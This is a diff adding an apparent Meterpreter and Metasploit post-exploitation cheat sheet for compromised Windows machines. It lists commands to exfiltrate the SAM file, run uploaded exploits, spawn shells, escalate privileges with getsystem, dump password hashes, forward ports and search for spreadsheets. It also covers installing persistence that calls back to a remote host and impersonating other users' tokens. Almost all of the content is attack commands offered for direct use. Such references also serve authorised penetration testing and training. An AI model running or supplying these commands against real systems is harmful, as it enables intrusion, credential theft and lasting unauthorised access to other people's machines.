@@ -1,0 +1,79 @@
+Meterpreter upload file to Windows target:
+
+`upload file c:\\windows`
+
+Meterpreter download file from Windows target:
+
+`download c:\\windows\\repair\\sam /tmp`
+
+Meterpreter run .exe on target – handy for executing uploaded exploits:
+
+`execute -f c:\\windows\\temp\\exploit.exe`
+
+Creates new channel with cmd shell:
+
+`execute -f cmd -c`
+
+Meterpreter show processes:
+
+`ps`
+
+Meterpreter get shell on the target:
+
+`shell`
+
+`Meterpreter attempts priviledge escalation the target:`
+
+`getsystem`
+
+Meterpreter attempts to dump the hashes on the target:
+
+`hashdump`
+`credcollect`
+
+Create port forward to target machine:
+
+`portfwd add –l 3389 –p 3389 –r $IP`
+
+Meterpreter delete port forward:
+
+`portfwd delete –l 3389 –p 3389 –r $IP`
+
+Search excel files on target machine:
+
+`search -f *.xlsx`
+
+Get user id:
+
+`getuid`
+
+Check system info
+
+`sysinfo`
+
+Identify other machines that the supplied domain user has administrative access to
+
+`run post/windows/gather/local_admin_search_enum
+connect $TARGET $PORT`
+
+Uses SSL:
+
+msf> connect -s $TARGET $PORT
+Starts ruby shell:
+
+msf> irb
+Integrations with other tools:
+
+msf> load pcap, wmap, nessus
+msf> db_hosts
+msf> db_vulns
+msf> db_exploited
+Meterpreter persistence mode
+
+meterpreter> run persistence -U -i 5 -p 443 -r $IP
+Impersonate any user
+
+meterpreter> use incognito
+meterpreter> list_tokens -u
+meterpreter> impersonate_token MACHINE\\user
+meterpreter> drop_token
